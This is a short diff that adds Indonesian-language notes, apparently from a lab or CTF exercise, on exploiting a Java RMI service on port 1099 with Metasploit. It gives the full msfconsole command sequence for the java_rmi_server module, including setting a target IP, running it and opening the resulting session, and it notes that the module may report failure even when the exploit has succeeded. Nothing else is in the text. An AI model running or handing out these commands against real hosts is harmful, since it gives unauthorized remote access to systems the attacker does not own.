@@ -1,0 +1,12 @@
+## exploit java-rmi,java-rmi ini berjalan pada port 1099
+
+$ msfconsole
+msf6 > search java_rmi
+msf6 > use exploit/multi/misc/java_rmi_server
+msf6 exploit(multi/misc/java_rmi_server) > set RHOSTS <ip target>
+msf6 exploit(multi/misc/java_rmi_server) > run
+
+# disini dikatakan failed tapi seberannya ini sudah berhasil
+# atau bisa ketik session -i <id>
+
+
